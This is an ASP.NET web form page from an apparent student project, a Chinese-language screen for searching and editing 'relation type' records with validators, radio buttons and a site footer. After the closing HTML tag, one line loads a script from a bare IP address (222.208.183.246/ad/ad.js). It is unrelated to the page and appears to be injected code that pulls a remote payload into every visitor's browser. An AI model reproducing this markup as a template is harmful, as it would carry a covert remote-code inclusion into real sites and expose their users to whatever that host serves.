<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rdefinitionmodification.aspx.vb" Inherits="relation.rdefinitionmodification"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rdefinitionmodification</title>
		<meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_LANGUAGE" content="Visual Basic .NET 7.1">
		<meta name="vs_defaultClientScript" content="JavaScript">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
	</HEAD>
	<body>
		<FORM id="Form1" method="post" runat="server">
			<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
				border="0" valign="middle">
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
			<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
				<TR>
					<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
										href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
			<FONT face="宋体"></FONT>
			<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <a href="index.aspx">
									首页</a></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
							<SPAN class="p9"><a href="index.aspx">用户登录</a></SPAN> |<a href="newcustomer.aspx">注册
							</a></FONT>
					</TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="164" bgColor="#0859ad" height="20" style="WIDTH: 164px">&nbsp;
						<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff"><marquee direction="left" behavior="scroll" scrolldelay="100" loop="-1">欢迎您 
									&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<CENTER>
				<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
					border="0">
					<TBODY>
						<TR>
							<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
								<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TABLE>
								<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
												<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
													<TR>
														<TD width="147" height="45">
															<DIV align="center">&nbsp;&nbsp;<a href="rmodelmodification.aspx">修改关系空间</a></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="43">
															<DIV align="center"><a href="rdefinitionmodification.aspx">修改关系类型</a></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="55">
															<DIV align="center"><a href="rinstancemodification.aspx">修改关系实例</a></DIV>
														</TD>
													</TR>
												</TABLE>
												<BR>
												<BR>
											</DIV>
										</TD>
									</TR>
								</TABLE>
							</TD>
							<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
							<TD vAlign="top" width="611">
								<TABLE id="Table1" style="WIDTH: 562px; HEIGHT: 322px" cellSpacing="1" cellPadding="1"
									width="562" border="1">
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 32px"><FONT face="宋体">
												<TABLE id="Table5" style="WIDTH: 288px; HEIGHT: 34px" cellSpacing="1" cellPadding="1" width="288"
													border="1">
													<TR>
														<TD style="WIDTH: 103px">
															<asp:Label id="lblDefSearch" runat="server" Width="104px">关系类型搜索:</asp:Label></TD>
														<TD style="WIDTH: 156px">
															<asp:DropDownList id="ddlstDefSearch" runat="server"></asp:DropDownList></TD>
													</TR>
												</TABLE>
											</FONT>
										</TD>
										<TD style="WIDTH: 241px; HEIGHT: 32px"><FONT face="宋体">
												<TABLE id="Table6" style="WIDTH: 253px; HEIGHT: 34px" cellSpacing="1" cellPadding="1" width="253"
													border="1">
													<TR>
														<TD style="WIDTH: 103px">
															<asp:DropDownList id="ddlstDefAtt" runat="server">
																<asp:ListItem Value="按关系类型编号">按关系类型编号</asp:ListItem>
																<asp:ListItem Value="按关系类型名称">按关系类型名称</asp:ListItem>
															</asp:DropDownList></TD>
														<TD style="WIDTH: 156px">
															<asp:Button id="btnDefSearch" runat="server" Width="54px" Text="搜索"></asp:Button></TD>
													</TR>
												</TABLE>
											</FONT>
										</TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 6px">
											<asp:Label id="lblDefKey" runat="server">关系类型编号</asp:Label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 6px">
											<asp:Label id="lblIsDir" runat="server" Width="128px">是否有向关系</asp:Label></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 29px">
											<asp:TextBox id="txtDefKey" runat="server"></asp:TextBox>
											<asp:regularexpressionvalidator id="txtDefKeyRegularExpressionValidator" runat="server" Width="240px" ErrorMessage="！输入关系类型编号必须为数字"
												ValidationExpression="[0-9]{1,}" ControlToValidate="txtDefKey" Height="14px"></asp:regularexpressionvalidator></TD>
										<TD style="WIDTH: 241px; HEIGHT: 29px">
											<asp:RadioButton id="rbtnIsDirYes" runat="server" Width="88px" Text="有向" GroupName="rbtnIsDir"></asp:RadioButton>&nbsp;&nbsp;
											<asp:RadioButton id="rbtnIsDirNo" runat="server" Text="无向" GroupName="rbtnIsDir"></asp:RadioButton></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 7px">
											<asp:Label id="lblDefName" runat="server">关系类型名称</asp:Label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 7px"><FONT face="宋体">
												<asp:Label id="lblAccPri" runat="server" Width="104px">用户权限</asp:Label></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 29px">
											<asp:TextBox id="txtDefName" runat="server"></asp:TextBox></TD>
										<TD style="WIDTH: 241px; HEIGHT: 29px">
											<asp:radiobutton id="rbtnAccPri1" runat="server" Text="权限1" GroupName="rbtnAccPri"></asp:radiobutton>
											<asp:radiobutton id="rbtnAccPri2" runat="server" Text="权限2" GroupName="rbtnAccPri"></asp:radiobutton>
											<asp:radiobutton id="rbtnAccPri3" runat="server" Text="权限3" GroupName="rbtnAccPri"></asp:radiobutton></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 31px">
											<asp:Label id="lblDefNum" runat="server">关系对象个数</asp:Label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 31px">
											<asp:Label id="lblIsConf" runat="server" Width="192px">是否需要关联对象的确认</asp:Label></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 29px">
											<asp:TextBox id="txtDefNum" runat="server"></asp:TextBox>
											<asp:regularexpressionvalidator id="txtRelObjNumRegularexpressionvalidator1" runat="server" Width="240px" ErrorMessage="！输入关系对象个数必须为整数"
												ValidationExpression="[0-9]{1,}" ControlToValidate="txtDefNum" Height="14px"></asp:regularexpressionvalidator></TD>
										<TD style="WIDTH: 241px; HEIGHT: 29px">
											<asp:RadioButton id="rbtnIsConfYes" runat="server" Text="需要确认" GroupName="rbtnIsConf"></asp:RadioButton><FONT face="宋体">&nbsp;
												<asp:RadioButton id="rbtnIsConfNo" runat="server" Text="不需要确认" GroupName="rbtnIsConf"></asp:RadioButton></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 32px">
											<asp:Label id="lblIsValid" runat="server">关系空间有效性</asp:Label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 32px"><FONT face="宋体"></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px">
											<asp:RadioButton id="rbtnIsValidYes" runat="server" Text="有效" GroupName="rbtnIsValid"></asp:RadioButton><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
												<asp:RadioButton id="rbtnIsValidNo" runat="server" Text="无效" GroupName="rbtnIsValid"></asp:RadioButton></FONT></TD>
										<TD style="WIDTH: 241px"></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px; HEIGHT: 7px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</TD>
										<TD style="WIDTH: 241px; HEIGHT: 7px"></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 229px">
											<TABLE id="Table3" cellSpacing="1" cellPadding="1" width="300" border="1">
												<TR>
													<TD style="WIDTH: 143px">&nbsp;</TD>
													<TD style="WIDTH: 73px">
														<asp:Button id="btnNext" runat="server" Text="下一步"></asp:Button></TD>
													<TD><FONT face="宋体"></FONT></TD>
												</TR>
											</TABLE>
										</TD>
										<TD style="WIDTH: 241px">
											<TABLE id="Table4" style="WIDTH: 274px; HEIGHT: 32px" cellSpacing="1" cellPadding="1" width="274"
												border="1">
												<TR>
													<TD style="WIDTH: 50px">&nbsp;</TD>
													<TD style="WIDTH: 73px">
														<asp:Button id="btnCancel" runat="server" Text="撤消"></asp:Button></TD>
													<TD><FONT face="宋体"></FONT></TD>
												</TR>
											</TABLE>
										</TD>
									</TR>
								</TABLE>
								<asp:label id="lblWarning" runat="server" Width="408px" ForeColor="#0000C0">label</asp:label>
		</FORM>
		<FORM style="MARGIN: 0px" name="loginForm" action="" method="post">
			&nbsp;&nbsp;
		</FORM>
		<FORM id="Form2" method="post">
			<FONT face="宋体"></FONT></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
			<CENTER>
				<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="779" border="0" style="WIDTH: 779px; HEIGHT: 80px">
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
						</TD>
					</TR>
				</TABLE>
			</CENTER>
		</FORM>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
